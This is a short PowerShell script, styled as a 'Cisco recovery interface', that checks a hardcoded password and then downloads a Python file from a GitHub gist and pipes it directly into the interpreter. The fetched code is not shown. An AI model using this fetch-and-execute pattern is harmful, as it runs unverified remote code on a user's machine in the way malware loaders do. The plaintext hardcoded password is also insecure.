# BHOOMI REMOTE INTERFACE
Clear-Host
$C = [ConsoleColor]::Cyan

Write-Host "--- BHOOMI CISCO RECOVERY INTERFACE ---" -ForegroundColor $C
$pass = Read-Host "Enter Access Password"

if ($pass -eq "Dinesh") {
    Write-Host "[+] Authentication Successful." -ForegroundColor Green
    
    # 1. Pre-install dependencies so Python doesn't have to
    Write-Host "[*] Checking environment..." -ForegroundColor Gray
    python -m pip install requests colorama urllib3 --quiet

    # 2. Fetch the Engine
    $url = "https://gist.githubusercontent.com/urflameww/e0685a4f3ab6325dceda596f7f45d611/raw/Bhoomi.py"
    $code = (New-Object Net.WebClient).DownloadString($url)
    
    # 3. Launch directly
    $code | python -
} else {
    Write-Host "[-] Access Denied." -ForegroundColor Red
    Start-Sleep -Seconds 2
}
